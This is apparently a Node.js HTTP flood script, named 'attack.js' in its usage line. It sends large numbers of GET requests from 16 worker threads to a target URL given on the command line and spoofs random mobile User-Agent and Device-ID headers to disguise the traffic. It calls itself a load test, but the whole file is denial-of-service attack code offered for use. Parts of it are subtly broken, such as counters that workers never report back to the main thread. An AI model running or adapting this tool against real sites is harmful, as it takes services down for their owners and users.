const http = require('http');
const https = require('https');
const { Worker, isMainThread, workerData } = require('worker_threads');
const url = require('url');
const os = require('os');

// Global counters for logging
let sent = 0;
let arrived = 0;

// Generate Random Mobile User-Agent (UA)
function generateRandomUA() {
  const mobileBrands = ['Apple', 'Samsung', 'Huawei', 'Google', 'Xiaomi'];
  const devices = ['iPhone', 'Galaxy', 'Pixel', 'Mate', 'Redmi'];
  const osVersions = ['14.4', '10.0', '11', '9', '13'];
  const randomBrand = mobileBrands[Math.floor(Math.random() * mobileBrands.length)];
  const randomDevice = devices[Math.floor(Math.random() * devices.length)];
  const randomOSVersion = osVersions[Math.floor(Math.random() * osVersions.length)];
  
  return `${randomBrand} ${randomDevice} ${randomOSVersion}`;
}

// Generate Random Device ID (Android or iOS format)
function generateRandomDeviceID() {
  return Math.random() < 0.5 
    ? `${Math.floor(Math.random() * 1e10)}${Math.floor(Math.random() * 1e6)}` // Android style ID
    : `ios-${Math.random().toString(36).substring(2, 15)}`; // iOS style ID
}

// HTTP Request Function to send requests
function sendRequest(targetUrl) {
  const options = {
    hostname: targetUrl.hostname,
    port: targetUrl.protocol === 'https:' ? 443 : 80, // Use 443 for HTTPS, 80 for HTTP
    path: targetUrl.pathname,
    method: 'GET',
    headers: {
      'User-Agent': generateRandomUA(),
      'Device-ID': generateRandomDeviceID(),
      'Connection': 'keep-alive',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.5',
    }
  };

  const requestLib = targetUrl.protocol === 'https:' ? https : http; // Choose correct module

  const req = requestLib.request(options, (res) => {
    arrived++; // Increment arrived count on response
    res.on('data', () => {}); // Discard data, focusing on requests
    res.on('end', () => {}); // Do nothing after request ends
  });

  req.on('error', (err) => {
    console.error(`Error: ${err.message}`);
  });

  req.end();
  sent++; // Increment sent count when a request is sent
}

// Worker function to send requests in parallel
function workerFunction(targetUrl, requests) {
  for (let i = 0; i < requests; i++) {
    sendRequest(targetUrl);
  }
}

// Main function to manage threads
function startLoadTest(targetUrl, duration) {
  const numThreads = 16; // Number of threads for load generation
  const requestsPerThread = Math.floor(duration * 1000 / numThreads); // Calculate based on seconds, not ms

  // Create workers
  for (let i = 0; i < numThreads; i++) {
    new Worker(__filename, {
      workerData: { targetUrl: targetUrl, requests: requestsPerThread },
    });
  }
}

// Logging function to overwrite every 100ms
function logStats() {
  setInterval(() => {
    process.stdout.clearLine();  // Clears the current line
    process.stdout.cursorTo(0);  // Moves the cursor to the beginning of the line
    console.log(`Sent: ${sent} | Arrived: ${arrived}`); // Overwrite the stats every 100ms
  }, 100); // 100ms interval
}

// If the current thread is the main thread, handle arguments and run the load test
if (isMainThread) {
  const args = process.argv.slice(2);
  const targetUrl = url.parse(args[0]); // Parse URL from command-line argument
  const duration = parseInt(args[1], 10); // Duration in seconds (not ms)

  if (!targetUrl || isNaN(duration)) {
    console.error('Usage: node attack.js <target_url> <duration_in_sec>');
    process.exit(1);
  }

  // Start logging stats
  logStats();

  // Start the load test
  startLoadTest(targetUrl, duration);
} else {
  // Worker thread logic
  const { targetUrl, requests } = workerData;
  workerFunction(targetUrl, requests);
}
